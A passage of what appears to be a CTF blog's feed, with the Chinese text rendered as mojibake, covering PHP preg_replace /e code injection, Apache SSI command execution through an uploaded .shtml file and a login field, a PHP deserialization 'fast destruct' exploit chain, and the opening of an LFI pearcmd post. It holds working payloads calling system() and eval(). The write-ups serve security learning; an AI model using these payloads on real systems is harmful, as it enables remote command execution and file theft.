class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ­£åˆ™å°±å˜æˆ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27;S*)/ei&#x27;,&#x27;strtolower(&quot;phpinfo()&quot;)&#x27;,$str)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„\Sæ„æ€æ˜¯åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼Œæ³¨æ„æ˜¯å¤§å†™Sï¼Œå¤§å°å†™Sæ˜¯ç”±åŒºåˆ«çš„</p><ul><li>[\S]è¡¨ç¤ºéç©ºç™½å°±åŒ¹é…</li><li>[\s]è¡¨ç¤ºå‡ºç°ç©ºç™½å°±åŒ¹é…</li></ul><p>æœ€ç»ˆpayload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;eval($_GET[pass])&#125;&amp;pass=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240119223722075.png" alt="image-20240119223722075"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¡ˆä¾‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;</summary>
      
    
    
    
    
    <category term="php CTF" scheme="http://example.com/tags/php-CTF/"/>
    
  </entry>
  
  <entry>
    <title>SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://example.com/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-12-31T13:25:44.000Z</published>
    <updated>2023-12-31T13:42:00.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰æ²¡æœ‰å¬è¿‡è¿™ä¸ªæ¼æ´ï¼Œåœ¨åšBUUCTFä¸€é“é¢˜ä¸­å‘ç°äº†ï¼Œå­¦ä¹ ä¸€ä¸‹ã€‚</p><h1 id="Apache-SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Apache-SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h1><p>åœ¨æµ‹è¯•ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„æ—¶å€™ï¼Œç›®æ ‡æœåŠ¡ç«¯å¯èƒ½ä¸å…è®¸ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ã€‚ä½†æ˜¯å¦‚æœç›®æ ‡æœåŠ¡å™¨<strong>å¼€å¯äº†SSIå’ŒCGIæ”¯æŒ</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œå¹¶æ„é€ å‘½ä»¤æ‰§è¡Œæ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä¸Šä¼ shell.shtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd==&quot;ls&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231213248547.png" alt="image-20231231213248547"></p><p>è®¿é—®ï¼ŒæˆåŠŸæ‰§è¡Œ</p><p><img src="/../images/image-20231231213331385.png" alt="image-20231231213331385"></p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.hacking8.com/bug-product/Apache-SSI/Apache-SSI-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">Apache-SSI-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</a></p><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>å‰é¢ä¸å†èµ˜è¿°ï¼Œè¿™é‡Œä»ç™»å½•æˆåŠŸå¼€å§‹ã€‚</p><p>å¦‚å›¾ï¼Œæ­£ç¡®çš„è´¦å·å¯†ç ç™»å½•</p><p><img src="/../images/image-20231231212333674.png" alt="image-20231231212333674"></p><p>å¯ä»¥å‘ç°ç”Ÿæˆäº†ä¸€ä¸ªshtmlæ–‡ä»¶</p><p>è®¿é—®</p><p><img src="/../images/image-20231231212351223.png" alt="image-20231231212351223"></p><p>è§‚å¯Ÿä¸€ä¸‹ï¼Œadminæ˜¯usernameçš„å€¼ï¼Œè¢«è¾“å‡ºï¼Œç»“åˆä¼šç”Ÿæˆshtmlæ–‡ä»¶ï¼ŒçŒœæƒ³ä¼šä¸ä¼šå­˜åœ¨SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=20206666</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231212208158.png" alt="image-20231231212208158"></p><p>è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°flagæ–‡ä»¶</p><p><img src="/../images/image-20231231212146502.png" alt="image-20231231212146502"></p><p>è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231214137226.png" alt="image-20231231214137226"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¹‹å‰æ²¡æœ‰å¬è¿‡è¿™ä¸ªæ¼æ´ï¼Œåœ¨åšBUUCTFä¸€é“é¢˜ä¸­å‘ç°äº†ï¼Œå­¦ä¹ ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h1 id=&quot;Apache-SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="ctf RCE" scheme="http://example.com/tags/ctf-RCE/"/>
    
  </entry>
  
  <entry>
    <title>Fast destruct</title>
    <link href="http://example.com/2023/12/27/Fast-destruct/"/>
    <id>http://example.com/2023/12/27/Fast-destruct/</id>
    <published>2023-12-27T04:43:37.000Z</published>
    <updated>2023-12-27T05:13:15.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯Fast-destruct"><a href="#ä»€ä¹ˆæ˜¯Fast-destruct" class="headerlink" title="ä»€ä¹ˆæ˜¯Fast destruct"></a>ä»€ä¹ˆæ˜¯Fast destruct</h1><p>åœ¨phpä¸­ï¼Œæœ‰</p><ul><li>å¦‚æœå•ç‹¬æ‰§è¡Œ<strong>unserialize</strong>å‡½æ•°è¿›è¡Œååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–åçš„æ•´ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»ä¹Ÿå°±æ²¡æœ‰äº†ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šæ‰§è¡Œå®ƒ</li><li>å¦‚æœååºåˆ—åŒ–å‡½æ•°åºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡è¢«èµ‹ç»™äº†ç¨‹åºä¸­çš„å˜é‡ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–çš„å¯¹è±¡å…¶ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œç”±äºå®ƒä¸€ç›´éƒ½å­˜åœ¨äºè¿™ä¸ªå˜é‡ä¸­ï¼Œå½“è¿™ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶æ‰ä¼šæ‰§è¡Œå…¶ææ„å‡½æ•°ã€‚</li></ul><p>é€šä¿—æ¥è®²ï¼Œå°±æ˜¯phpä¸­çš„æ‰€æœ‰ç±»åªæœ‰åœ¨phpä»£ç æ¸²æŸ“é¡µé¢æ¸²æŸ“ç»“æŸåæ‰ä¼šè¢«é”€æ¯ï¼Œåªæœ‰é”€æ¯çš„æ—¶å€™æ‰èƒ½è§¦å‘**__destruxct()<strong>å‡½æ•°ï¼Œä¸€æ—¦å‡ºç°æŠ¥é”™æˆ–è€…ä»£ç ç»ˆæ­¢å°±ä¸ä¼šè§¦å‘</strong>destruct**å‡½æ•°ã€‚</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p><strong>unserialize</strong>å‡½æ•°ååºåˆ—åŒ–è¿‡ç¨‹ï¼š</p><p><strong>è·å–ååºåˆ—åŒ–å­—ç¬¦ä¸²-&gt;æ ¹æ®ç±»å‹è¿›è¡Œååºåˆ—åŒ–-&gt;æ‰¾åˆ°å¯¹åº”ååºåˆ—åŒ–ç±»-&gt;æ ¹æ®å­—ç¬¦åˆ¤æ–­å…ƒç´ ä¸ªæ•°-&gt;åˆ›å»ºå¯¹è±¡-&gt;è¿­ä»£è§£æå‰©ä¸‹çš„å­—ç¬¦ä¸²-&gt;åˆ¤æ–­æ˜¯å¦æœ‰__wakeup()å¹¶æ ‡è®°-&gt;é‡Šæ”¾ç©ºé—´å¹¶åˆ¤æ–­æ˜¯å¦å…·æœ‰æ ‡è®°-&gt;è°ƒç”¨</strong></p><p>æ•´ä¸ªè¿‡ç¨‹é€æ­¥å¯¹å¯¹è±¡è¿›è¡Œè§£æï¼Œè€Œä¸”ä¼šæ ¹æ®ç›¸åº”çš„é­”æ³•å‡½æ•°æ ‡è®°å»è°ƒç”¨ã€‚å³ä½¿å®Œæ•´çš„ååºåˆ—åŒ–å¤±è´¥ï¼Œæ¶‰åŠåˆ°çš„å¯¹è±¡ä»ç„¶å¯ä»¥è§¦å‘é­”æ³•å‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚</p><p>è€Œ<strong>Fast destruct</strong>çš„ç›®çš„å°±æ˜¯åˆ©ç”¨<strong>unserialize</strong>è¿è¡Œå¤±è´¥åä¼šå¯¹å·²ç»åˆ›å»ºçš„ç±»è¿›è¡Œé”€æ¯è¿™ä¸€ç‰¹æ€§å»<strong>æå‰è§¦å‘__destruct()å‡½æ•°</strong></p><h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><p><strong>NewStarCTF 2023 å…¬å¼€èµ›é“ More Fast</strong></p><p>è¿™é“é¢˜æè¿°å¦‚ä¸‹</p><p><img src="/../images/image-20231227130402440.png" alt="image-20231227130402440"></p><p>æ¥çœ‹æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ„é€ exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;func=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><strong>ä½†æ˜¯æœ«å°¾æœ‰</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªthrowå°±æ˜¯**GCå›æ”¶(åƒåœ¾å›æ”¶æœºåˆ¶)**ï¼Œä¼šå›æ”¶è¢«é”€æ¯çš„ç±»ï¼Œå¯¼è‡´__destruct()æ£€æµ‹ä¸åˆ°è¢«é”€æ¯çš„ç±»ï¼Œä¹Ÿå°±æ— æ³•è§¦å‘</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æå‰è§¦å‘__destruct()æ¥è¿›è¡Œç»•è¿‡</p><h2 id="ä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°"><a href="#ä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°" class="headerlink" title="ä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°"></a>ä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°</h2><p>æ­£å¸¸åºåˆ—åŒ–å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231227131019178.png" alt="image-20231227131019178"></p><h2 id="å»æ‰åºåˆ—åŒ–å°¾éƒ¨"><a href="#å»æ‰åºåˆ—åŒ–å°¾éƒ¨" class="headerlink" title="å»æ‰åºåˆ—åŒ–å°¾éƒ¨"></a>å»æ‰åºåˆ—åŒ–å°¾éƒ¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ€åcat &#x2F;f</strong>*</p><p><img src="/../images/image-20231227131119013.png" alt="image-20231227131119013"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä»€ä¹ˆæ˜¯Fast-destruct&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯Fast-destruct&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯Fast destruct&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯Fast destruct&lt;/h1&gt;&lt;p&gt;åœ¨phpä¸­ï¼Œæœ‰&lt;/p&gt;
&lt;u</summary>
      
    
    
    
    
    <category term="CTF php" scheme="http://example.com/tags/CTF-php/"/>
    
  </entry>
  
  <entry>
    <title>LFIåŒ…å«pearcmdå‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://example.com/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-12-23T08:17:06.000Z</published>
    <updated>2024-03-08T07:15:30.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h1><p>pearå…¨ç§°PHP Extension and Application Reposition(phpæ‰©å±•å’Œåº”ç”¨ä»“åº“)ï¼Œåœ¨dockerä¸­é»˜è®¤å®‰è£…ï¼Œè·¯å¾„ä¸º&#x2F;usr&#x2F;loacl&#x2F;lib&#x2F;php</p><p>register_argc_argvä¸ºOnæ—¶ï¼Œ$_SERVER[â€˜argvâ€™]å’Œ$_SERVER[â€˜argcâ€™]ä¼šè®°å½•ä¸€äº›ä¸œè¥¿ã€‚åœ¨webä¸­ï¼Œä¼ å‚æ—¶ä½¿ç”¨+è¿æ¥çš„å€¼çš„ä¸ªæ•°å°±æ˜¯argcï¼Œå„ä¸ªå‚æ•°è¢«å­˜åˆ°argvé‡Œã€‚</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>0.php?a&#x3D;a</p><p><img src="/../images/image-20231223164158153.png" alt="image-20231223164158153"></p><p>0.php?a&#x3D;a+b+c</p><p><img src="/../images/image-20231223164214690.png" alt="image-20231223164214690"></p><p>è¿™é‡Œæ˜¯æ ¹æ®+åšåˆ†éš”ç¬¦æ¥åˆ¤æ–­ã€‚</p><h1 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" 